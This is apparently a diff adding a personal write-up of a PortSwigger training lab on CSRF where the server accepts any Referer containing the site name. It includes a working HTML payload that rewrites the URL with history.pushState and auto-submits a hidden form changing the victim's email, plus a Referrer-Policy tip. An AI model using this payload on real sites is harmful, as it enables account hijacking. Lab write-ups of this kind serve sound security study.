@@ -1,0 +1,45 @@
+Lab #12:  CSRF with broken Referer validation
+
+
+
+Target:  changes the victim's email address
+
+This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address.
+
+Analysis:
+
+
+   There is a csrf vulnerability in change email and no csrf token is provided.
+
+   CSRF prevention is through the referer http header. 
+
+    - setting no referrer in html code results in invalid referrer error:
+       <meta name="referrer" content="no-referrer">
+
+    - but when we add some prefix to the referrer value using burpsuit, it accepts it. 
+    so the serever look for the site name somewhere in the referrer string:
+
+    Referer: https://attacker web site. myPOrtSwiggerID.web-security-academy.net/my-account/change-email
+   
+
+
+   to change the referrer, add some appendix to the history:
+
+      <html>
+        <body>
+            <script>history.pushState("", "", "/?myPOrtSwiggerID.web-security-academy.net") </script>
+
+            <form action="https://myPOrtSwiggerID.web-security-academy.net/my-account/change-email" method="POST">
+                <input type="hidden" name="email" value="pwned52@evil-user.net" />
+            </form>
+            <script>
+
+                document.forms[0].submit();
+            </script>
+        </body>
+    </html>
+
+    also, we need to set Referrer-Policy: unsafe-url in the head section to make sure the added prefix is not removed.
+
+
+
